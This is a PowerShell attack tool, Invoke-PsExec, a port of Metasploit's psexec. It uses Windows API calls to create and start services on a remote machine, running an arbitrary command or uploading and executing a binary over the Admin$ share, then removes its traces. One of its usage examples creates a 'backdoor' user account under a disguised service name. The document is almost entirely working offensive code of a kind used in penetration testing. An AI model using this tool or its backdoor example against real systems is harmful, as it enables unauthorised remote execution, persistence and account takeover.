function Invoke-PsExec {
<#
    .SYNOPSIS

        This function is a rough port of Metasploit's psexec functionality.
        It utilizes Windows API calls to open up the service manager on
        a remote machine, creates/run a service with an associated binary
        path or command, and then cleans everything up.

        Either a -Command or a custom -ServiceEXE can be specified.
        For -Commands, a -ResultsFile can also be specified to retrieve the
        results of the executed command.

        Adapted from MSF's version (see links).

        Author: @harmj0y
        License: BSD 3-Clause

    .PARAMETER ComputerName

        ComputerName to run the command on.

    .PARAMETER Command

        Binary path (or Windows command) to execute.

    .PARAMETER ServiceName

        The name of the service to create, defaults to "TestSVC"

    .PARAMETER ResultFile

        Switch. If you want results from your command, specify this flag.
        Name of the file to write the results to locally, defaults to
        copying in the temporary result file to the local location.

    .PARAMETER ServiceEXE

        Local service binary to upload/execute on the remote host
        (instead of a command to execute).

    .PARAMETER NoCleanup

        Don't remove the service after starting it (for ServiceEXEs).

    .EXAMPLE

        PS C:\> Invoke-PsExec -ComputerName 192.168.50.200 -Command "net user backdoor password123 /add" -ServiceName Updater32

        Creates a user named backdoor on the 192.168.50.200 host, with the
        temporary service being named 'Updater32'.

    .EXAMPLE

        PS C:\> Invoke-PsExec -ComputerName 192.168.50.200 -Command "dir C:\" -ServiceName Updater32 -ResultFile "results.txt"

        Runs the "dir C:\" command on 192.168.50.200 with a temporary service named 'Updater32', 
        and copies the result file to "results.txt" on the local path.

    .EXAMPLE

        PS C:\> Invoke-PsExec -ComputerName 192.168.50.200 -ServiceName Updater32 -ServiceEXE "service.exe"

        Uploads "service.exe" to the remote host, registers/starts it as a service with name
        'Updater32', and removes the service/binary after it runs (or fails to respond w/in 30 seconds).

    .LINK

        https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/psexec.rb
        https://github.com/rapid7/metasploit-framework/blob/master/tools/psexec.rb
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] 
        [String]
        $ComputerName,

        [String]
        $Command,

        [String]
        $ServiceName = "TestSVC",

        [String]
        $ResultFile,

        [String]
        $ServiceEXE,

        [switch]
        $NoCleanup
    )

    $ErrorActionPreference = "Stop"

    #  http://stackingcode.com/blog/2011/10/27/quick-random-string
    function Local:Get-RandomString 
    {
        param (
            [int]$Length = 12
        )
        $set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) {
            $result += $set | Get-Random
        }
        $result
    }

    # from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    # from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }


    function Local:Invoke-PsExecCmd
    {
        param(
            [Parameter(Mandatory = $True)] 
            [String]
            $ComputerName,

            [Parameter(Mandatory = $True)]
            [String]
            $Command,

            [String]
            $ServiceName = "TestSVC",

            [switch]
            $NoCleanup
        )

        # Declare/setup all the needed API function
        # adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html 
        $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
        $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
        $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    

        $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
        $OpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])
        $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
        
        $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
        $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])
        $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)
      
        $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
        $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
        $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)

        $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
        $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([IntPtr])
        $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)

        $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
        $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])
        $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)

        $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
        $GetLastErrorDelegate = Get-DelegateType @() ([Int])
        $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)

        # Step 1 - OpenSCManager()
        # 0xF003F = SC_MANAGER_ALL_ACCESS
        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
        # "[*] Opening service manager"
        $ManagerHandle = $OpenSCManagerA.Invoke("\\$ComputerName", "ServicesActive", 0xF003F)
        # Write-Verbose "[*] Service manager handle: $ManagerHandle"

        # if we get a non-zero handle back, everything was successful
        if ($ManagerHandle -and ($ManagerHandle -ne 0)){

            # Step 2 - CreateService()
            # 0xF003F = SC_MANAGER_ALL_ACCESS
            # 0x10 = SERVICE_WIN32_OWN_PROCESS
            # 0x3 = SERVICE_DEMAND_START
            # 0x1 = SERVICE_ERROR_NORMAL
            # "[*] Creating new service: '$ServiceName'"
            $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $Command, $null, $null, $null, $null, $null)
            # Write-Verbose "[*] CreateServiceA Handle: $ServiceHandle"

            if ($ServiceHandle -and ($ServiceHandle -ne 0)){

                # Write-Verbose "[*] Service successfully created"

                # Step 3 - CloseServiceHandle() for the service handle
                # "[*] Closing service handle"
                $t = $CloseServiceHandle.Invoke($ServiceHandle)

                # Step 4 - OpenService()
                # "[*] Opening the service '$ServiceName'"
                $ServiceHandle = $OpenServiceA.Invoke($ManagerHandle, $ServiceName, 0xF003F)
                # Write-Verbose "[*] OpenServiceA handle: $ServiceHandle"

                if ($ServiceHandle -and ($ServiceHandle -ne 0)){

                    # Step 5 - StartService()
                    # "[*] Starting the service"
                    $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)

                    # if we successfully started the service, let it breathe and then delete it
                    if ($val -ne 0){
                        # Write-Verbose "[*] Service successfully started"
                        # breathe for a second
                        Start-Sleep -s 1
                    }
                    else{
                        # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
                        $err = $GetLastError.Invoke()
                        if ($err -eq 1053){
                            # Write-Warning "[*] Command didn't respond to start"
                        }
                        else{
                            # Write-Warning "[!] StartService failed, LastError: $err"
                            "[!] StartService failed, LastError: $err"
                        }
                        # breathe for a second
                        Start-Sleep -s 1
                    }

                    if (-not $NoCleanup) {
                        # start cleanup
                        # Step 6 - DeleteService()
                        # "[*] Deleting the service '$ServiceName'"
                        $val = $DeleteService.invoke($ServiceHandle)
                        
                        if ($val -eq 0){
                            # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
                            $err = $GetLastError.Invoke()
                            # Write-Warning "[!] DeleteService failed, LastError: $err"
                        }
                        else{
                            # Write-Verbose "[*] Service successfully deleted"
                        }
                    }
                    
                    # Step 7 - CloseServiceHandle() for the service handle 
                    # "[*] Closing the service handle"
                    $val = $CloseServiceHandle.Invoke($ServiceHandle)
                    # Write-Verbose "[*] Service handle closed off"

                }
                else{
                    # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
                    $err = $GetLastError.Invoke()
                    # Write-Warning "[!] OpenServiceA failed, LastError: $err"
                    "[!] OpenServiceA failed, LastError: $err"
                }
            }

            else{
                # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
                $err = $GetLastError.Invoke()
                # Write-Warning "[!] CreateService failed, LastError: $err"
                "[!] CreateService failed, LastError: $err"
            }

            # final cleanup - close off the manager handle
            # "[*] Closing the manager handle"
            $t = $CloseServiceHandle.Invoke($ManagerHandle)
        }
        else{
            # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
            $err = $GetLastError.Invoke()
            # Write-Warning "[!] OpenSCManager failed, LastError: $err"
            "[!] OpenSCManager failed, LastError: $err"
        }
    }

    if ($Command -and ($Command -ne "")) { 

        if ($ResultFile -and ($ResultFile -ne "")) {
            # if we want to retrieve results from the invoked command

            # randomized temp files
            $TempText = $(Get-RandomString) + ".txt"
            $TempBat = $(Get-RandomString) + ".bat"

            # command to invoke to pipe to temp output files
            $cmd = "%COMSPEC% /C echo $Command ^> %systemroot%\Temp\$TempText > %systemroot%\Temp\$TempBat & %COMSPEC% /C start %COMSPEC% /C %systemroot%\Temp\$TempBat"

            # Write-Verbose "PsEexec results command: $cmd"

            try {
                # invoke the command specified
                "[*] Executing command and retrieving results: '$Command'"
                Invoke-PsExecCmd -ComputerName $ComputerName -Command $cmd -ServiceName $ServiceName

                # retrieve the result file for the command
                $RemoteResultFile = "\\$ComputerName\Admin$\Temp\$TempText"
                "[*] Copying result file $RemoteResultFile to '$ResultFile'"
                Copy-Item -Force -Path $RemoteResultFile -Destination $ResultFile
                
                # clean up the .txt and .bat files
                # Write-Verbose "[*] Removing $RemoteResultFile"
                Remove-Item -Force $RemoteResultFile

                # Write-Verbose "[*] Removing \\$ComputerName\Admin$\Temp\$TempBat"
                Remove-Item -Force "\\$ComputerName\Admin$\Temp\$TempBat"
            }
            catch {
                # Write-Warning "Error: $_"
                "Error: $_"
            }
        }

        else {
            # if we're executing a plain command w/o needing results
            # "[*] Executing command: '$Command'"
            Invoke-PsExecCmd -ComputerName $ComputerName -Command $Command -ServiceName $ServiceName
        }

    }

    elseif ($ServiceEXE -and ($ServiceEXE -ne "")) {
        # if we're using a custom .EXE for the PsExec call

        # upload the local service .EXE to the remote host
        $RemoteUploadPath = "\\$ComputerName\Admin$\$ServiceEXE"
        "[*] Copying service binary $ServiceEXE to '$RemoteUploadPath'"
        Copy-Item -Force -Path $ServiceEXE -Destination $RemoteUploadPath

        if(-not $NoCleanup) {
            # trigger the remote executable and cleanup after
            "[*] Executing service .EXE '$RemoteUploadPath' as service '$ServiceName' and cleaning up."
            Invoke-PsExecCmd -ComputerName $ComputerName -Command $RemoteUploadPath -ServiceName $ServiceName

            # remove the remote service .EXE
            "[*] Removing the remote service .EXE '$RemoteUploadPath'"
            Remove-Item -Path $RemoteUploadPath -Force
        }
        else {
            # upload/register the executable and don't clean up
           "[*] Executing service .EXE '$RemoteUploadPath' as service '$ServiceName' and not cleaning up."
            Invoke-PsExecCmd -ComputerName $ComputerName -Command $RemoteUploadPath -ServiceName $ServiceName -NoCleanup
        }
    }

    else {
        # error catching
        # Write-Warning "'-Command' or '-ServiceEXE' must be specified."
    }
}
